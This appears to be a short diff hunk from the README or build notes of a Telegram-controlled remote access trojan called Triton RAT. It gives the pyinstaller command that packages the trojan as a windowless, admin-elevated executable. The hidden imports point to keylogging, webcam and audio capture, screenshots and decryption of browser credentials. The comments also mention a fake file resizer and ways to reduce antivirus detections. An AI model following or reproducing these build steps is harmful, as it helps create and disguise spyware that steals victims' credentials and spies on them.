@@ -112,7 +112,7 @@ $ python fake_file_resizer.py
 # After that, paste minified code in Triton_RAT_Release.py, then build it with pyinstaller⬇️
 
 # After downloading pyinstaller run:
-$ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py
+$ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py
 
 # Some people says that you can decrease detections count with adding --key "testname" attribute when building it with pyinstaller
 # But, it didn't worked for me...
